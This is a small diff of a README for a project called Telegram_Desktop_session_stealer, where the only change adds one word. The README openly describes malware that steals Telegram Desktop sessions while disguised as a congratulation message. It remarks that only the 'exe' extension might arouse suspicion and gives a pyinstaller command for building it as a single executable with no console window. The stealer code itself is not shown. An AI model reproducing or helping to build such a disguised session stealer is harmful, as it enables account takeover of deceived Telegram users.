@@ -1,5 +1,5 @@
 # Telegram_Desktop_session_stealer
-Application that steals the Telegram Desctop session and looks like congratulation. The only thing that can arouse suspicion is "exe" extension.
+Application that steals the Telegram Desctop session and looks like congratulation. The only thing that can arouse suspicion is the "exe" extension.
 
 # Instruction
 1) To create standalone application type: "pyinstaller --add-data "*.png;." --add-data "*.gif;." --noconsole --onefile main.py".
